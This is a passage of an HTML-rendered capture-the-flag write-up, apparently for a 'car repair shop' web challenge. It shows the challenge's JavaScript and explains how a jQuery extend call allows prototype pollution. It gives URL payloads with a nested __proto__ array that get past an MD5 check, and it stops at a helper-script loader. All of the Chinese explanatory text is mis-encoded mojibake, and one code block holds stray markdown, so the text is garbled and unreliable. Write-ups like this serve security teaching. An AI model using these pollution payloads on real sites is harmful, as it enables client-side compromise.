class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">repair() &#123;</span><br><span class="line">    <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">        $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="è¯¥ä»£ç å°†JSONå¯¹è±¡ä¸­æä¾›çš„å±æ€§å’Œå€¼ä¸è¯¥Carå¯¹è±¡åˆå¹¶ã€‚è¿™å¾ˆå±é™©ï¼Œå¹¶ä¸”ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¯¦ç»†ä»‹ç»è¯·çœ‹æ­¤å¤„"><a href="#è¯¥ä»£ç å°†JSONå¯¹è±¡ä¸­æä¾›çš„å±æ€§å’Œå€¼ä¸è¯¥Carå¯¹è±¡åˆå¹¶ã€‚è¿™å¾ˆå±é™©ï¼Œå¹¶ä¸”ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¯¦ç»†ä»‹ç»è¯·çœ‹æ­¤å¤„" class="headerlink" title="è¯¥ä»£ç å°†JSONå¯¹è±¡ä¸­æä¾›çš„å±æ€§å’Œå€¼ä¸è¯¥Carå¯¹è±¡åˆå¹¶ã€‚è¿™å¾ˆå±é™©ï¼Œå¹¶ä¸”ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¯¦ç»†ä»‹ç»è¯·çœ‹æ­¤å¤„"></a>è¯¥ä»£ç å°†JSONå¯¹è±¡ä¸­æä¾›çš„å±æ€§å’Œå€¼ä¸è¯¥<code>Car</code>å¯¹è±¡åˆå¹¶ã€‚è¿™å¾ˆå±é™©ï¼Œå¹¶ä¸”ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚è¯¦ç»†ä»‹ç»è¯·çœ‹<a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/" target="_blank" rel="noopener">æ­¤å¤„</a></h6><h6 id="æˆ‘ä»¬èƒ½é‡å†™Carçš„-proto-å±æ€§ï¼Œå¹¶ä¸”å¼•å…¥å…¶ä»–çš„å±æ€§ã€‚"><a href="#æˆ‘ä»¬èƒ½é‡å†™Carçš„-proto-å±æ€§ï¼Œå¹¶ä¸”å¼•å…¥å…¶ä»–çš„å±æ€§ã€‚" class="headerlink" title="æˆ‘ä»¬èƒ½é‡å†™Carçš„__proto__å±æ€§ï¼Œå¹¶ä¸”å¼•å…¥å…¶ä»–çš„å±æ€§ã€‚"></a>æˆ‘ä»¬èƒ½é‡å†™<code>Car</code>çš„<code>__proto__</code>å±æ€§ï¼Œå¹¶ä¸”å¼•å…¥å…¶ä»–çš„å±æ€§ã€‚</h6><h6 id="æ¥ä¸‹æ¥æ˜¯è¿™ä¸ªignitionå‡½æ•°ã€‚"><a href="#æ¥ä¸‹æ¥æ˜¯è¿™ä¸ªignitionå‡½æ•°ã€‚" class="headerlink" title="æ¥ä¸‹æ¥æ˜¯è¿™ä¸ªignitionå‡½æ•°ã€‚"></a>æ¥ä¸‹æ¥æ˜¯è¿™ä¸ª<code>ignition</code>å‡½æ•°ã€‚</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ignition() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">""</span>) &#123;</span><br><span class="line">        infobox(<span class="string">`Looks like the key got lost. No wonder the car is not starting ...`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">"ğŸ”‘"</span>) &#123;</span><br><span class="line">        infobox(<span class="string">`The car started!`</span>)</span><br><span class="line">        <span class="keyword">this</span>.start()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">###### æˆ‘ä»¬éœ€è¦è®¾ç½®`</span>Car<span class="string">`å¯¹è±¡çš„keyå±æ€§æ¥å¯åŠ¨å®ƒã€‚å¦åˆ™ï¼Œè¿™ä¸‰ä¸ªåŠŸèƒ½ä¸­çš„æœ€åä¸€ä¸ª`</span>powerOn<span class="string">`å°†æ— æ³•å°†æˆ‘ä»¬å¸¦åˆ°ä¸‹ä¸€è¾†è½¦ï¼š</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">powerOn() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isStarted()) &#123;</span><br><span class="line">        infobox(<span class="string">`Well Done!`</span>)</span><br><span class="line">        nextCar()</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">'.chargeup'</span>)[<span class="number">0</span>].play()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nextCar = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    cars.push(cars.shift())</span><br><span class="line">    $(<span class="string">".image"</span>).attr(<span class="string">'src'</span>, cars[<span class="number">0</span>].pic);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="è¦ä¿®å¤ï¼Œbugattiæˆ‘ä»¬åªè¦keyåœ¨urlä¸­æŒ‡å®šemojiè¡¨æƒ…çš„å€¼ï¼Œç„¶årepair-functionå°†å®Œæˆå…¶å·¥ä½œï¼š"><a href="#è¦ä¿®å¤ï¼Œbugattiæˆ‘ä»¬åªè¦keyåœ¨urlä¸­æŒ‡å®šemojiè¡¨æƒ…çš„å€¼ï¼Œç„¶årepair-functionå°†å®Œæˆå…¶å·¥ä½œï¼š" class="headerlink" title="è¦ä¿®å¤ï¼Œbugattiæˆ‘ä»¬åªè¦keyåœ¨urlä¸­æŒ‡å®šemojiè¡¨æƒ…çš„å€¼ï¼Œç„¶årepair-functionå°†å®Œæˆå…¶å·¥ä½œï¼š"></a>è¦ä¿®å¤ï¼Œ<code>bugatti</code>æˆ‘ä»¬åªè¦<code>key</code>åœ¨urlä¸­æŒ‡å®šemojiè¡¨æƒ…çš„å€¼ï¼Œç„¶årepair-functionå°†å®Œæˆå…¶å·¥ä½œï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22&#125;</span><br></pre></td></tr></table></figure>

<h6 id="è¿™å°†æŠŠæˆ‘ä»¬å¸¦åˆ°porscheã€‚è¿™é‡Œå¯¹repairå’Œç‚¹ç«åŠŸèƒ½è¿›è¡Œäº†ä¸€äº›è‡ªå®šä¹‰ï¼š"><a href="#è¿™å°†æŠŠæˆ‘ä»¬å¸¦åˆ°porscheã€‚è¿™é‡Œå¯¹repairå’Œç‚¹ç«åŠŸèƒ½è¿›è¡Œäº†ä¸€äº›è‡ªå®šä¹‰ï¼š" class="headerlink" title="è¿™å°†æŠŠæˆ‘ä»¬å¸¦åˆ°porscheã€‚è¿™é‡Œå¯¹repairå’Œç‚¹ç«åŠŸèƒ½è¿›è¡Œäº†ä¸€äº›è‡ªå®šä¹‰ï¼š"></a>è¿™å°†æŠŠæˆ‘ä»¬å¸¦åˆ°<code>porsche</code>ã€‚è¿™é‡Œå¯¹<code>repair</code>å’Œç‚¹ç«åŠŸèƒ½è¿›è¡Œäº†ä¸€äº›è‡ªå®šä¹‰ï¼š</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">porsche.ignition = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    infobox(<span class="string">`Hmm ... WTF!`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="è¿™ä¸ªignitionå‡½æ•°æ˜¯ä¸é‡è¦çš„ï¼Œå› ä¸ºä»–åªæ˜¯è¾“å‡ºä¸€äº›æ–‡æœ¬ã€‚"><a href="#è¿™ä¸ªignitionå‡½æ•°æ˜¯ä¸é‡è¦çš„ï¼Œå› ä¸ºä»–åªæ˜¯è¾“å‡ºä¸€äº›æ–‡æœ¬ã€‚" class="headerlink" title="è¿™ä¸ªignitionå‡½æ•°æ˜¯ä¸é‡è¦çš„ï¼Œå› ä¸ºä»–åªæ˜¯è¾“å‡ºä¸€äº›æ–‡æœ¬ã€‚"></a>è¿™ä¸ª<code>ignition</code>å‡½æ•°æ˜¯ä¸é‡è¦çš„ï¼Œå› ä¸ºä»–åªæ˜¯è¾“å‡ºä¸€äº›æ–‡æœ¬ã€‚</h6><h6 id="è€Œè¿™ä¸ªrepairå‡½æ•°æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ã€‚"><a href="#è€Œè¿™ä¸ªrepairå‡½æ•°æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ã€‚" class="headerlink" title="è€Œè¿™ä¸ªrepairå‡½æ•°æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ã€‚"></a>è€Œè¿™ä¸ª<code>repair</code>å‡½æ•°æœ‰ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ã€‚</h6><h6 id="1-åœ¨bugattiå¯åŠ¨ä¹‹å‰ã€‚"><a href="#1-åœ¨bugattiå¯åŠ¨ä¹‹å‰ã€‚" class="headerlink" title="1. åœ¨bugattiå¯åŠ¨ä¹‹å‰ã€‚"></a>1. åœ¨<code>bugatti</code>å¯åŠ¨ä¹‹å‰ã€‚</h6><h6 id="2-porscheå¯¹è±¡çš„MD5å€¼éœ€è¦æ˜¯9cdfb439c7876e703e307864c9167a15"><a href="#2-porscheå¯¹è±¡çš„MD5å€¼éœ€è¦æ˜¯9cdfb439c7876e703e307864c9167a15" class="headerlink" title="2. porscheå¯¹è±¡çš„MD5å€¼éœ€è¦æ˜¯9cdfb439c7876e703e307864c9167a15"></a>2. <code>porsche</code>å¯¹è±¡çš„<code>MD5</code>å€¼éœ€è¦æ˜¯<code>9cdfb439c7876e703e307864c9167a15</code></h6><h6 id="1-å·²ç»ä½¿ç”¨äº†æ­£ç¡®çš„keyåœ¨urlä¸­ï¼Œæ˜¯éå¸¸å¥½çš„ã€‚"><a href="#1-å·²ç»ä½¿ç”¨äº†æ­£ç¡®çš„keyåœ¨urlä¸­ï¼Œæ˜¯éå¸¸å¥½çš„ã€‚" class="headerlink" title="(1) å·²ç»ä½¿ç”¨äº†æ­£ç¡®çš„keyåœ¨urlä¸­ï¼Œæ˜¯éå¸¸å¥½çš„ã€‚"></a>(1) å·²ç»ä½¿ç”¨äº†æ­£ç¡®çš„<code>key</code>åœ¨urlä¸­ï¼Œæ˜¯éå¸¸å¥½çš„ã€‚</h6><h6 id="2-éœ€è¦å»åšçš„æ˜¯ã€‚è¿™ä¸ªMD5çš„å€¼æ˜¯ç­‰äºè¿™ä¸ªå­—ç¬¦ä¸²lol-ä½ å¯ä»¥æŸ¥çœ‹æœ€å—æ¬¢è¿çš„hashè¡¨ï¼Œä¾‹å¦‚ï¼šcrackstation-net-ã€‚"><a href="#2-éœ€è¦å»åšçš„æ˜¯ã€‚è¿™ä¸ªMD5çš„å€¼æ˜¯ç­‰äºè¿™ä¸ªå­—ç¬¦ä¸²lol-ä½ å¯ä»¥æŸ¥çœ‹æœ€å—æ¬¢è¿çš„hashè¡¨ï¼Œä¾‹å¦‚ï¼šcrackstation-net-ã€‚" class="headerlink" title="(2) éœ€è¦å»åšçš„æ˜¯ã€‚è¿™ä¸ªMD5çš„å€¼æ˜¯ç­‰äºè¿™ä¸ªå­—ç¬¦ä¸²lol(ä½ å¯ä»¥æŸ¥çœ‹æœ€å—æ¬¢è¿çš„hashè¡¨ï¼Œä¾‹å¦‚ï¼šcrackstation.net)ã€‚"></a>(2) éœ€è¦å»åšçš„æ˜¯ã€‚è¿™ä¸ªMD5çš„å€¼æ˜¯ç­‰äºè¿™ä¸ªå­—ç¬¦ä¸²<code>lol</code>(ä½ å¯ä»¥æŸ¥çœ‹æœ€å—æ¬¢è¿çš„hashè¡¨ï¼Œä¾‹å¦‚ï¼šcrackstation.net)ã€‚</h6><h6 id="é‚£ä¹ˆæˆ‘ä»¬è¿™æ ·å»è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼å‘¢ï¼Ÿçœ‹åˆ°jquery-md5-jsä»–å±•ç°äº†è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼ï¼Œå°†æ˜¾ç¤ºçš„é€šè¿‡toStringæ–¹æ³•è·å¾—å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚"><a href="#é‚£ä¹ˆæˆ‘ä»¬è¿™æ ·å»è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼å‘¢ï¼Ÿçœ‹åˆ°jquery-md5-jsä»–å±•ç°äº†è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼ï¼Œå°†æ˜¾ç¤ºçš„é€šè¿‡toStringæ–¹æ³•è·å¾—å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚" class="headerlink" title="é‚£ä¹ˆæˆ‘ä»¬è¿™æ ·å»è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼å‘¢ï¼Ÿçœ‹åˆ°jquery.md5.jsä»–å±•ç°äº†è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼ï¼Œå°†æ˜¾ç¤ºçš„é€šè¿‡toStringæ–¹æ³•è·å¾—å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚"></a>é‚£ä¹ˆæˆ‘ä»¬è¿™æ ·å»è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼å‘¢ï¼Ÿçœ‹åˆ°<code>jquery.md5.js</code>ä»–å±•ç°äº†è®¡ç®—å¯¹è±¡çš„å“ˆå¸Œå€¼ï¼Œå°†æ˜¾ç¤ºçš„é€šè¿‡<code>toString</code>æ–¹æ³•è·å¾—å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºçš„å“ˆå¸Œå€¼ã€‚</h6><h6 id="è¦æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦å»é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åœ¨è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚"><a href="#è¦æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦å»é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åœ¨è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚" class="headerlink" title="è¦æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦å»é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åœ¨è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚"></a>è¦æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦å»é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯åœ¨è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚</h6><h6 id="æˆ‘ä»¬ä¸èƒ½åˆ›å»ºæˆ–è€…æ”¹å˜è¿™ä¸ªæ–¹æ³•å¯¹äºé€šè¿‡jqueryçš„æ‰©å±•å¯¹äºrepairå‡½æ•°ï¼Œä»…ä»…æ”¹å˜å±æ€§ï¼Œç”±äºä»–æ˜¯JSONã€‚"><a href="#æˆ‘ä»¬ä¸èƒ½åˆ›å»ºæˆ–è€…æ”¹å˜è¿™ä¸ªæ–¹æ³•å¯¹äºé€šè¿‡jqueryçš„æ‰©å±•å¯¹äºrepairå‡½æ•°ï¼Œä»…ä»…æ”¹å˜å±æ€§ï¼Œç”±äºä»–æ˜¯JSONã€‚" class="headerlink" title="æˆ‘ä»¬ä¸èƒ½åˆ›å»ºæˆ–è€…æ”¹å˜è¿™ä¸ªæ–¹æ³•å¯¹äºé€šè¿‡jqueryçš„æ‰©å±•å¯¹äºrepairå‡½æ•°ï¼Œä»…ä»…æ”¹å˜å±æ€§ï¼Œç”±äºä»–æ˜¯JSONã€‚"></a>æˆ‘ä»¬ä¸èƒ½åˆ›å»ºæˆ–è€…æ”¹å˜è¿™ä¸ªæ–¹æ³•å¯¹äºé€šè¿‡jqueryçš„æ‰©å±•å¯¹äº<code>repair</code>å‡½æ•°ï¼Œä»…ä»…æ”¹å˜å±æ€§ï¼Œç”±äºä»–æ˜¯JSONã€‚</h6><h6 id="ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæœ‰è¶£çš„javaScriptæ•°ç»„å±æ€§å’Œå‰é¢æåˆ°çš„åŸå‹é“¾æ±¡æŸ“ã€‚å½“æ•°ç»„åœ¨javascriptä¸­è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä»–å°†æˆä¸ºç”±ç»„æˆçš„å…ƒç´ çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚"><a href="#ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæœ‰è¶£çš„javaScriptæ•°ç»„å±æ€§å’Œå‰é¢æåˆ°çš„åŸå‹é“¾æ±¡æŸ“ã€‚å½“æ•°ç»„åœ¨javascriptä¸­è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä»–å°†æˆä¸ºç”±ç»„æˆçš„å…ƒç´ çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚" class="headerlink" title="ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæœ‰è¶£çš„javaScriptæ•°ç»„å±æ€§å’Œå‰é¢æåˆ°çš„åŸå‹é“¾æ±¡æŸ“ã€‚å½“æ•°ç»„åœ¨javascriptä¸­è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä»–å°†æˆä¸ºç”±ç»„æˆçš„å…ƒç´ çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚"></a>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæœ‰è¶£çš„javaScriptæ•°ç»„å±æ€§å’Œå‰é¢æåˆ°çš„åŸå‹é“¾æ±¡æŸ“ã€‚å½“æ•°ç»„åœ¨javascriptä¸­è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä»–å°†æˆä¸ºç”±ç»„æˆçš„å…ƒç´ çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚</h6><h6 id="å› æ­¤-quot-lol-quot-å˜æˆ-quot-lol-quot-ã€‚ç°åœ¨ç»“åˆåŸå‹é“¾çš„æ±¡æŸ“ï¼Œå¯ä»¥è½»æ¾çš„é€šè¿‡ä¸‹é¢çš„éªŒè¯ï¼š"><a href="#å› æ­¤-quot-lol-quot-å˜æˆ-quot-lol-quot-ã€‚ç°åœ¨ç»“åˆåŸå‹é“¾çš„æ±¡æŸ“ï¼Œå¯ä»¥è½»æ¾çš„é€šè¿‡ä¸‹é¢çš„éªŒè¯ï¼š" class="headerlink" title="å› æ­¤[&quot;lol&quot;]å˜æˆ&quot;lol&quot;ã€‚ç°åœ¨ç»“åˆåŸå‹é“¾çš„æ±¡æŸ“ï¼Œå¯ä»¥è½»æ¾çš„é€šè¿‡ä¸‹é¢çš„éªŒè¯ï¼š"></a>å› æ­¤[&quot;lol&quot;]å˜æˆ&quot;lol&quot;ã€‚ç°åœ¨ç»“åˆåŸå‹é“¾çš„æ±¡æŸ“ï¼Œå¯ä»¥è½»æ¾çš„é€šè¿‡ä¸‹é¢çš„éªŒè¯ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.md5(&#123;__proto__:[&quot;lol&quot;]&#125;) == &apos;9cdfb439c7876e703e307864c9167a15&apos;</span><br></pre></td></tr></table></figure>

<h5 id="ä½†æ˜¯åœ¨ï¼Œpayloadä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œå¦åˆ™æˆ‘å°†å¤±å»Carç±»æä¾›çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œè€Œæ˜¯å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„çš„å¯¹è±¡æ¥é¿å…è¿™ç§æƒ…å†µã€‚"><a href="#ä½†æ˜¯åœ¨ï¼Œpayloadä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œå¦åˆ™æˆ‘å°†å¤±å»Carç±»æä¾›çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œè€Œæ˜¯å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„çš„å¯¹è±¡æ¥é¿å…è¿™ç§æƒ…å†µã€‚" class="headerlink" title="ä½†æ˜¯åœ¨ï¼Œpayloadä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œå¦åˆ™æˆ‘å°†å¤±å»Carç±»æä¾›çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œè€Œæ˜¯å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„çš„å¯¹è±¡æ¥é¿å…è¿™ç§æƒ…å†µã€‚"></a>ä½†æ˜¯åœ¨ï¼Œpayloadä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œå¦åˆ™æˆ‘å°†å¤±å»<code>Car</code>ç±»æä¾›çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ç›´æ¥å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„ï¼Œè€Œæ˜¯å°†åŸå‹è®¾ç½®ä¸ºæ•°ç»„çš„å¯¹è±¡æ¥é¿å…è¿™ç§æƒ…å†µã€‚</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;: &#123;&quot;__proto__&quot;: [&quot;lol&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ç°åœ¨ï¼Œæ–°çš„payloadå¦‚ä¸‹ï¼š"><a href="#ç°åœ¨ï¼Œæ–°çš„payloadå¦‚ä¸‹ï¼š" class="headerlink" title="ç°åœ¨ï¼Œæ–°çš„payloadå¦‚ä¸‹ï¼š"></a>ç°åœ¨ï¼Œæ–°çš„payloadå¦‚ä¸‹ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22,%22__proto__%22:%20&#123;%22__proto__%22:%20[%22lol%22]&#125;&#125;#BugattiPorsche</span><br></pre></td></tr></table></figure>

<h5 id="ä¸ºä»€ä¹ˆä¸Šé¢çš„payloadèƒ½å¤Ÿå¤„ç†æˆåŠŸï¼Œä½ å¯ä»¥è‡ªå·±ä½“éªŒä¸€æ³¢ã€‚"><a href="#ä¸ºä»€ä¹ˆä¸Šé¢çš„payloadèƒ½å¤Ÿå¤„ç†æˆåŠŸï¼Œä½ å¯ä»¥è‡ªå·±ä½“éªŒä¸€æ³¢ã€‚" class="headerlink" title="ä¸ºä»€ä¹ˆä¸Šé¢çš„payloadèƒ½å¤Ÿå¤„ç†æˆåŠŸï¼Œä½ å¯ä»¥è‡ªå·±ä½“éªŒä¸€æ³¢ã€‚"></a>ä¸ºä»€ä¹ˆä¸Šé¢çš„payloadèƒ½å¤Ÿå¤„ç†æˆåŠŸï¼Œä½ å¯ä»¥è‡ªå·±ä½“éªŒä¸€æ³¢ã€‚</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const json=&#123;&quot;__proto__&quot;: &#123;&quot;__proto__&quot;: [&quot;lol&quot;]&#125;&#125;;</span><br><span class="line">    const str=unescape(encodeURIComponent(json));</span><br><span class="line">    console.log(str);</span><br><span class="line">    console.log($.md5(&#123;&quot;__proto__&quot;: &#123;&quot;__proto__&quot;: [&quot;lol&quot;]&#125;&#125;) === &apos;9cdfb439c7876e703e307864c9167a15&apos;);</span><br></pre></td></tr></table></figure>

<h5 id="ä½¿ç”¨è¿™ä¸ªpayloadæˆ‘ä»¬ç»•è¿‡äº†MD5çš„æ£€æŸ¥ï¼Œæ¥ä¸‹æ¥å¤„ç†åˆ°äº†repairWithHelperå‡½æ•°ã€‚"><a href="#ä½¿ç”¨è¿™ä¸ªpayloadæˆ‘ä»¬ç»•è¿‡äº†MD5çš„æ£€æŸ¥ï¼Œæ¥ä¸‹æ¥å¤„ç†åˆ°äº†repairWithHelperå‡½æ•°ã€‚" class="headerlink" title="ä½¿ç”¨è¿™ä¸ªpayloadæˆ‘ä»¬ç»•è¿‡äº†MD5çš„æ£€æŸ¥ï¼Œæ¥ä¸‹æ¥å¤„ç†åˆ°äº†repairWithHelperå‡½æ•°ã€‚"></a>ä½¿ç”¨è¿™ä¸ªpayloadæˆ‘ä»¬ç»•è¿‡äº†MD5çš„æ£€æŸ¥ï¼Œæ¥ä¸‹æ¥å¤„ç†åˆ°äº†<code>repairWithHelper</code>å‡½æ•°ã€‚</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span 